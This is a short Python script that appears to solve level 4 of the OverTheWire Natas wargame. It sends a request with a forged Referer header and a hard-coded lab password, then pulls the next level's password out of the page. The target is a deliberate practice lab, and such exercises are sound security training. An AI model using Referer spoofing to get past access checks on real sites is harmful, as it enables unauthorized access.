import requests
import re

headers = {
    'Referer': 'http://natas5.natas.labs.overthewire.org/',
}

response = requests.get(
    'http://natas4.natas.labs.overthewire.org/',
    headers=headers,
    auth=('natas4', 'tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm'),
)

#print(response.text)

print(re.findall('natas5 is (.*)\n', response.text)[0])